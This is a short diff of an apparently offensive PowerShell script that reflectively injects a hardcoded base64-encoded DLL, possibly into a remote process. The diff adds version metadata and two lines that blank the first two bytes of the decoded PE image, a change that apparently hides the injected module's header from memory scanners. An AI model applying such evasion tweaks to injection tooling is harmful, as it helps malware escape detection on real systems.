@@ -23,6 +23,8 @@ Contributors: This script has a byte array hardcoded, which contains a DLL wich 
 License: GPLv3 or later
 Required Dependencies: None
 Optional Dependencies: None
+Version: 1.0
+ReflectivePEInjection version: 1.0
 
 .DESCRIPTION
 
@@ -2567,6 +2569,8 @@ $RemoteScriptBlock = {
         {
             [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
         }
+        $PEBytes[0] = 0
+        $PEBytes[1] = 0
 		
 		#If a remote process to inject in to is specified, get a handle to it
 		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
